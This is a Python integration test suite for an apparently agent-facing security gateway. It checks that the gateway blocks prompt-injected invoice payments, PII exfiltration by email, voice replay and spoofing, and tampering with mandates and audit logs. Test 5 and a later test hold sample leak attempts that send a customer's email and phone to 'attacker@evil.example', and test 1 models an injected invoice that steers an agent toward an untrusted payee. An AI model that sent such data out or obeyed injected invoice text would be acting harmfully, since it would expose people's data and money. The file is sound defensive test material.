"""The ten Phase 2 scenarios through ``fastmcp.Client -> gateway -> demo servers``."""

import asyncio
import base64
import json
from pathlib import Path
from typing import Any

import pytest
from fastmcp import Client

from tests.integration.test_gateway_harness import (
    INJECTED_INVOICE,
    TRUSTED_INVOICE,
    Env,
    make_env_sync,
    parse_error,
)
from trishul.audit.verify import verify
from trishul.domains.voice_adapters import ScriptedASR, SpoofResult
from trishul.domains.voicetrust import NonceService, VoiceTrust

AUDIO = Path(__file__).resolve().parents[2] / "trishul" / "fixtures" / "audio"
ACME = "acme@okaxis"


def audit_events(env: Env) -> list[dict[str, Any]]:
    rows = env.conn.execute("SELECT payload FROM audit_leaves ORDER BY idx").fetchall()
    return [json.loads(bytes(r["payload"])) for r in rows]


async def read_invoice(env: Env, name: str) -> tuple[str, str, str]:
    doc = await env.call("files_read_document", {"doc_id": env.doc_id(name)})
    assert set(doc) == {"handle", "summary"}
    payee = await env.call("extract_field", {"handle": doc["handle"], "field": "payee_vpa"})
    amount = await env.call("extract_field", {"handle": doc["handle"], "field": "amount_paise"})
    return doc["handle"], payee["handle"], amount["handle"]


# 1 ------------------------------------------------------------------------------------------
async def test_1_injected_invoice_denied_with_lineage(env: Env) -> None:
    env.gw.bind_task(purpose="payment_processing", category="PAYMENT", text="Pay invoice INV-1002")
    raw = await env.client.call_tool(
        "files_read_document", {"doc_id": env.doc_id(INJECTED_INVOICE)}
    )
    text = json.dumps(raw.structured_content)
    assert "refund.desk" not in text and "content" not in (raw.structured_content or {})
    summary = (raw.structured_content or {})["summary"]
    assert summary["hidden_text_detected"] is True and summary["injection_score"] >= 0.5
    _, payee, amount = await read_invoice(env, INJECTED_INVOICE)
    body = await env.denied("upi_pay_upi", {"payee_vpa": payee, "amount_paise": amount})
    assert body["decision"] == "DENY" and "PAYSHIELD.TAINT.UNTRUSTED_PAYEE" in body["rules"]
    assert env.ledger_rows() == 0 and env.balance() == 5_000_000
    ev = env.call_events()[-1]
    assert ev["decision"] == "DENY" and ev["labels"]["payee_vpa"].startswith("UNTRUSTED_EXTERNAL")
    kinds = {n["id"]: n["kind"] for n in ev["lineage"]["nodes"]}
    chain = {(e["src"], e["dst"]) for e in ev["lineage"]["edges"]}
    doc_node = next(n for n, k in kinds.items() if k == "source" and "document" in n)
    var_node = next(n for n, k in kinds.items() if k == "derivation")
    sink_node = next(n for n, k in kinds.items() if k == "sink")
    assert (doc_node, var_node) in chain and (var_node, sink_node) in chain


# 2 ------------------------------------------------------------------------------------------
async def test_2_trusted_invoice_allowed_ledger_changes_only_after_execution(env: Env) -> None:
    env.gw.bind_task(purpose="payment_processing", category="PAYMENT", text="Pay invoice INV-1001")
    _, payee, amount = await read_invoice(env, TRUSTED_INVOICE)
    assert env.ledger_rows() == 0
    out = await env.call("upi_pay_upi", {"payee_vpa": payee, "amount_paise": amount})
    assert out["balance_after"] == 5_000_000 - 450_000 and env.ledger_rows() == 1
    ev = env.call_events()[-1]
    assert ev["decision"] == "ALLOW"
    assert ev["effect"] == {"summary": "Pay INR 4500.00 to acme@okaxis", "balance_after": 4_550_000}
    assert ev["audit_hash"] and ev["mandate"]["state"] == "valid"
    execution = [e for e in audit_events(env) if e.get("type") == "execution"][-1]
    assert execution["ledger"] == {
        "balance_before": 5_000_000,
        "balance_after": 4_550_000,
        "rows_added": 1,
    }
    assert verify(env.conn, env.keys).ok


# 3 + 4 --------------------------------------------------------------------------------------
async def test_3_over_cap_step_up_approve_exact_retry(env: Env) -> None:
    env.gw.bind_task(
        purpose="payment_processing",
        category="PAYMENT",
        text="Pay Acme 7500 rupees",
        params={"payee_vpa": ACME, "amount_paise": 750_000},
    )
    args = {"payee_vpa": ACME, "amount_paise": 750_000}
    body = await env.denied("upi_pay_upi", args)
    assert body["decision"] == "STEP_UP" and body["approval_id"] and body["call_digest"]
    assert env.ledger_rows() == 0
    step = env.call_events()[-1]
    assert step["effect"]["balance_after"] == 4_250_000 and step["approval"]["state"] == "pending"
    # repeating before approval must not create a second pending approval
    again = await env.denied("upi_pay_upi", args)
    assert again["approval_id"] == body["approval_id"]
    env.gw.backend.resolve_approval(body["approval_id"], "approve", "sreekar")
    out = await env.call("upi_pay_upi", args)
    assert out["balance_after"] == 4_250_000 and env.ledger_rows() == 1
    # the token is single use
    replay = await env.denied("upi_pay_upi", args)
    assert replay["decision"] == "STEP_UP" and env.ledger_rows() == 1


async def test_3b_concurrent_retries_spend_once(env: Env) -> None:
    env.gw.bind_task(
        purpose="payment_processing",
        category="PAYMENT",
        text="Pay Acme 7500 rupees",
        params={"payee_vpa": ACME, "amount_paise": 750_000},
    )
    args = {"payee_vpa": ACME, "amount_paise": 750_000}
    body = await env.denied("upi_pay_upi", args)
    env.gw.backend.resolve_approval(body["approval_id"], "approve", "sreekar")
    results = await asyncio.gather(
        *(env.client.call_tool("upi_pay_upi", args, raise_on_error=False) for _ in range(4))
    )
    assert sum(1 for r in results if not r.is_error) == 1
    assert env.ledger_rows() == 1 and env.balance() == 4_250_000


async def test_4_amount_changed_after_approval_denied_on_binding(env: Env) -> None:
    env.gw.bind_task(
        purpose="payment_processing",
        category="PAYMENT",
        text="Pay Acme",
        params={"payee_vpa": ACME, "amounts": [750_000, 760_000]},
    )
    body = await env.denied("upi_pay_upi", {"payee_vpa": ACME, "amount_paise": 750_000})
    env.gw.backend.resolve_approval(body["approval_id"], "approve", "sreekar")
    swapped = await env.denied("upi_pay_upi", {"payee_vpa": ACME, "amount_paise": 760_000})
    assert (
        swapped["decision"] == "DENY" and "PAYSHIELD.APPROVAL.BINDING_MISMATCH" in swapped["rules"]
    )
    assert env.ledger_rows() == 0


# 5 ------------------------------------------------------------------------------------------
async def test_5_crm_pii_to_disallowed_email_sink_denied(env: Env) -> None:
    env.gw.bind_task(purpose="order_support", category="COMMUNICATION", text="Help customer C-1042")
    record = await env.call("crm_read_customer_data", {"customer_id": "C-1042", "fields": ["name"]})
    assert "pan" not in record and "aadhaar" not in record and "phone" not in record
    assert record["email"] == "rajesh.kumar@example.com"
    ev = env.call_events()[-1]
    assert {"pan", "aadhaar", "phone"} <= set(ev["redaction"]["fields"])
    leak = {
        "to": "attacker@evil.example",
        "subject": "details",
        "body": f"Customer mail {record['email']} phone +919876543210",
    }
    body = await env.denied("mail_send_email", leak)
    assert body["decision"] == "DENY" and "PURPOSELOCK.EGRESS.PII_WITHOUT_CONSENT" in body["rules"]
    assert env.conn.execute("SELECT COUNT(*) FROM outbox").fetchone()[0] == 0
    # the data subject's own address is a permitted sink for order_support
    # (planner-authored subject/body is untrusted, so a human approval is required first)
    reply = {"to": record["email"], "subject": "Order", "body": "Your order is completed"}
    pending = await env.denied("mail_send_email", reply)
    assert pending["decision"] == "STEP_UP"
    env.gw.backend.resolve_approval(pending["approval_id"], "approve", "sreekar")
    ok = await env.call("mail_send_email", reply)
    assert ok["status"] == "queued"
    dpdp = env.gw.backend.dpdp()
    assert dpdp["entries"] and all(e["event"]["domain"] == "purposelock" for e in dpdp["entries"])


# 6 ------------------------------------------------------------------------------------------
async def test_6_withdrawn_consent_denied_immediately(env: Env) -> None:
    env.gw.bind_task(purpose="order_support", category="READ", text="Help customer C-1042")
    args = {"customer_id": "C-1042", "fields": ["name"]}
    await env.call("crm_read_customer_data", args)  # allowed and cached
    env.gw.backend.withdraw_consent("cn_0104200001")
    body = await env.denied("crm_read_customer_data", args)
    assert body["decision"] == "DENY"
    assert "PURPOSELOCK.CONSENT.READ_WITHOUT_CONSENT" in body["rules"]


# 7 + 8 --------------------------------------------------------------------------------------
class PhraseASR(ScriptedASR):
    def __init__(self) -> None:
        super().__init__(None)

    def say(self, text: str | None, *, ran: bool = True) -> None:
        self._text, self._ran = text, ran


class FixedSpoof:
    def __init__(self, score: float | None) -> None:
        self.score_value = score

    def available(self) -> bool:
        return True

    def score(self, samples: object) -> SpoofResult:
        return SpoofResult(self.score_value, self.score_value is not None, "fixed-test-double")


def clip(name: str) -> str:
    return base64.b64encode((AUDIO / name).read_bytes()).decode()


async def voice_env(
    tmp_path: Path, spoof: Any = None, category: str = "READ"
) -> tuple[Env, PhraseASR, Client[Any]]:
    asr = PhraseASR()
    vt = VoiceTrust(NonceService(), asr, spoof or FixedSpoof(0.05))
    gw, conn, ids, keys, clock, events = make_env_sync(tmp_path, voice=vt)
    client: Client[Any] = Client(gw.mcp)
    await client.__aenter__()
    env = Env(gw, client, conn, ids, keys, clock, events)
    env.gw.bind_task(purpose="order_support", category=category, text="voice request")
    return env, asr, client


def voice_args(env: Env, asr: PhraseASR, wav: str = "tone_clean_3s.wav") -> dict[str, Any]:
    nonce = env.gw.backend.issue_voice_nonce(env.gw.pipeline.session)
    asr.say(f"please {nonce['phrase']} thanks")
    return {"clip_b64": clip(wav), "clip_id": "clip_1", "nonce_id": nonce["nonce_id"]}


async def test_7_replayed_voice_nonce_denied(tmp_path: Path) -> None:
    env, asr, client = await voice_env(tmp_path)
    try:
        args = voice_args(env, asr)
        first = await env.call("voice_command", args)
        assert set(first) == {"handle", "summary"} and first["summary"]["liveness"] == "match"
        assert env.call_events()[-1]["decision"] == "ALLOW"
        body = await env.denied("voice_command", args)  # same nonce again
        assert body["decision"] == "DENY" and "VOICETRUST.LIVENESS.MISMATCH" in body["rules"]
    finally:
        await client.__aexit__(None, None, None)


async def test_8_low_quality_or_uncertain_voice_never_allowed(tmp_path: Path) -> None:
    env, asr, client = await voice_env(tmp_path)
    try:
        noisy = await env.denied("voice_command", voice_args(env, asr, "tone_noisy_3s.wav"))
        assert (
            noisy["decision"] == "STEP_UP" and "VOICETRUST.QUALITY.INSUFFICIENT" in noisy["rules"]
        )
        assert noisy["approval_id"]  # an out-of-band approval is raised; voice cannot grant it
        args = voice_args(env, asr)
        asr.say(None, ran=False)  # ASR unavailable: liveness unknown
        unsure = await env.denied("voice_command", args)
        assert unsure["decision"] == "STEP_UP" and "VOICETRUST.ASR.NOT_RUN" in unsure["rules"]
        # a voice-derived value can never reach a payment sink
        env.gw.bind_task(purpose="payment_processing", category="PAYMENT", text="pay")
    finally:
        await client.__aexit__(None, None, None)


async def test_8b_suspicious_spoof_score_is_step_up(tmp_path: Path) -> None:
    env, asr, client = await voice_env(tmp_path, spoof=FixedSpoof(0.3))
    try:
        body = await env.denied("voice_command", voice_args(env, asr))
        assert body["decision"] == "STEP_UP" and "VOICETRUST.SPOOF.SUSPECT" in body["rules"]
        env.gw.pipeline.set_ml(False)  # ML off: no spoof score => fail closed to STEP_UP
        off = await env.denied("voice_command", voice_args(env, asr))
        assert off["decision"] == "STEP_UP" and "VOICETRUST.SPOOF.NOT_RUN" in off["rules"]
        env.gw.pipeline.set_ml(True)
        assert any(e.get("type") == "ml_state" and e["ml"] is True for e in env.events)
    finally:
        await client.__aexit__(None, None, None)


# 9 ------------------------------------------------------------------------------------------
async def test_9_tampered_mandate_signature_denied(env: Env) -> None:
    env.gw.bind_task(
        purpose="payment_processing",
        category="PAYMENT",
        text="Pay Acme",
        params={"payee_vpa": ACME, "amount_paise": 100_000},
    )
    row = env.conn.execute("SELECT mandate_id, body FROM mandates").fetchone()
    tampered = row["body"].replace('"per_txn_cap":500000', '"per_txn_cap":50000000')
    assert tampered != row["body"]
    env.conn.execute("UPDATE mandates SET body=? WHERE mandate_id=?", (tampered, row["mandate_id"]))
    body = await env.denied("upi_pay_upi", {"payee_vpa": ACME, "amount_paise": 100_000})
    assert body["decision"] == "DENY" and "PAYSHIELD.MANDATE.SIGNATURE" in body["rules"]
    assert env.ledger_rows() == 0
    assert env.call_events()[-1]["mandate"]["state"] == "invalid"


# 10 -----------------------------------------------------------------------------------------
async def test_10_tampered_audit_payload_reports_exact_index(env: Env) -> None:
    env.gw.bind_task(purpose="payment_processing", category="READ", text="balance")
    for _ in range(5):
        await env.call("upi_get_balance")
    assert verify(env.conn, env.keys).ok
    target = 4
    payload = bytes(
        env.conn.execute("SELECT payload FROM audit_leaves WHERE idx=?", (target,)).fetchone()[0]
    )
    flipped = (
        payload.replace(b"ALLOW", b"DENYX", 1) if b"ALLOW" in payload else payload[:-2] + b"X}"
    )
    env.conn.execute("UPDATE audit_leaves SET payload=? WHERE idx=?", (flipped, target))
    result = verify(env.conn, env.keys)
    assert not result.ok and result.bad_index == target
    reported = env.gw.backend.audit_verify()
    assert reported["ok"] is False and reported["bad_index"] == target
    assert any(e.get("type") == "audit_verify" and e["bad_id"] == target for e in env.events)


# extras -------------------------------------------------------------------------------------
async def test_agent_purpose_argument_is_ignored_and_audited(env: Env) -> None:
    env.gw.bind_task(purpose="order_support", category="READ", text="Help C-1042")
    await env.call(
        "crm_read_customer_data",
        {"customer_id": "C-1042", "fields": ["name"], "purpose": "marketing"},
    )
    ev = env.call_events()[-1]
    assert ev["decision"] == "ALLOW"
    assert "PURPOSELOCK.PURPOSE.IGNORED_AGENT_VALUE" in ev["rules"]
    kinds = [e.get("type") for e in audit_events(env)]
    assert "purpose_ignored" in kinds


async def test_ml_anomaly_step_up_and_toggle_persisted(env: Env) -> None:
    env.gw.bind_task(
        purpose="payment_processing",
        category="PAYMENT",
        text="pay",
        params={"payee_vpa": ACME, "amounts": [100_000, 101_000, 99_000, 100_500, 99_500, 400_000]},
    )
    for amount in (100_000, 101_000, 99_000):
        await env.call("upi_pay_upi", {"payee_vpa": ACME, "amount_paise": amount})
    # daily cap is 10,000: keep within it by using a second day
    env.clock.advance(days=1)
    for amount in (100_500, 99_500):
        await env.call("upi_pay_upi", {"payee_vpa": ACME, "amount_paise": amount})
    odd = await env.denied("upi_pay_upi", {"payee_vpa": ACME, "amount_paise": 400_000})
    assert odd["decision"] == "STEP_UP" and "CORE.ML.SIGNAL" in odd["rules"]
    env.gw.backend.set_ml(False)
    assert env.gw.pipeline.ml_enabled() is False
    out = await env.call("upi_pay_upi", {"payee_vpa": ACME, "amount_paise": 400_000})
    assert out["balance_after"] < 5_000_000
    assert env.call_events()[-1]["ml"] == "off"


async def test_voice_cannot_approve(env: Env) -> None:
    with pytest.raises(PermissionError):
        env.gw.backend.resolve_approval("x", "approve", "voice:clip_1")


async def test_error_body_has_no_raw_untrusted_content(env: Env) -> None:
    env.gw.bind_task(purpose="payment_processing", category="PAYMENT", text="Pay")
    body = await env.denied("upi_pay_upi", {"payee_vpa": "refund.desk@ybl", "amount_paise": 1})
    assert "refund.desk" not in json.dumps(body)
    assert parse_error  # helper re-exported for other modules


# universal approval binding (non-payment tool) ---------------------------------------------
async def test_send_email_untrusted_body_step_up_approve_exact_retry_only(env: Env) -> None:
    env.gw.bind_task(purpose="order_support", category="COMMUNICATION", text="Help customer C-1042")
    record = await env.call("crm_read_customer_data", {"customer_id": "C-1042", "fields": ["name"]})
    args = {"to": record["email"], "subject": "Order", "body": "Your order is completed"}
    body = await env.denied("mail_send_email", args)
    assert body["decision"] == "STEP_UP"
    assert "PURPOSELOCK.TAINT.UNTRUSTED_EMAIL_CONTENT" in body["rules"]
    env.gw.backend.resolve_approval(body["approval_id"], "approve", "sreekar")
    changed = await env.denied("mail_send_email", {**args, "body": "Different text entirely"})
    assert changed["decision"] == "DENY"
    assert "PAYSHIELD.APPROVAL.BINDING_MISMATCH" in changed["rules"]
    assert env.conn.execute("SELECT COUNT(*) FROM outbox").fetchone()[0] == 0
    ok = await env.call("mail_send_email", args)
    assert ok["status"] == "queued"
    replay = await env.denied("mail_send_email", args)  # single use
    assert replay["decision"] == "STEP_UP"


async def test_untrusted_recipient_denied_even_with_pending_approval(env: Env) -> None:
    env.gw.bind_task(purpose="order_support", category="COMMUNICATION", text="Help customer")
    body = await env.denied(
        "mail_send_email", {"to": "x@evil.example", "subject": "s", "body": "b"}
    )
    assert body["decision"] == "DENY"
    assert "PURPOSELOCK.TAINT.UNTRUSTED_RECIPIENT" in body["rules"]


# voice holds the gateway lock for every stage except the offloaded assessment ---------------
async def test_voice_command_holds_lock_except_during_assess(tmp_path: Path) -> None:
    env, asr, client = await voice_env(tmp_path)
    lock = env.gw.pipeline._lock
    seen: dict[str, bool] = {}
    orig_transcribe = asr.transcribe

    def spy_transcribe(samples: Any) -> Any:
        seen["during_assess"] = lock.locked()
        return orig_transcribe(samples)

    asr.transcribe = spy_transcribe  # type: ignore[method-assign]
    orig_finish = env.gw.pipeline._finish

    async def spy_finish(*a: Any, **kw: Any) -> Any:
        seen["at_finish"] = lock.locked()
        return await orig_finish(*a, **kw)

    env.gw.pipeline._finish = spy_finish  # type: ignore[method-assign]
    try:
        await env.call("voice_command", voice_args(env, asr))
        assert seen == {"during_assess": False, "at_finish": True}
        assert not lock.locked()
    finally:
        await client.__aexit__(None, None, None)


async def test_voice_payment_always_needs_out_of_band_approval(tmp_path: Path) -> None:
    env, asr, client = await voice_env(tmp_path, spoof=FixedSpoof(0.01), category="PAYMENT")
    try:
        args = voice_args(env, asr)  # perfect clip, nonce matches, spoof score ~0
        body = await env.denied("voice_command", args)
        assert body["decision"] == "STEP_UP" and "VOICETRUST.SINK.HIGH_RISK" in body["rules"]
        assert body["approval_id"]
        env.gw.backend.resolve_approval(body["approval_id"], "approve", "console")
        again = await env.call("voice_command", args)  # same clip + nonce, now approved
        assert "handle" in again
        replay = await env.denied("voice_command", args)  # token is single use
        assert replay["decision"] in ("STEP_UP", "DENY")
        # a different clip (other sha256) under the same nonce is not covered by the approval
        other = dict(args, clip_b64=clip("tone_noisy_3s.wav"))
        assert (await env.denied("voice_command", other))["decision"] != "ALLOW"
    finally:
        await client.__aexit__(None, None, None)
